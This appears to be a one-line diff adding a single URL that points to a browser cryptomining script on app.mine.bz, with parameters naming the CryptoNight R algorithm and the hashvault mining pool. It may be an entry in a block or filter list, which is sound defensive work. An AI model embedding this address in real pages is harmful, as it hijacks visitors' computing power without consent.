@@ -1,0 +1,1 @@
+https://app.mine.bz/altyn.js?perfekt=wss://?algo=cn/r?jason=pool.hashvault.pro:443
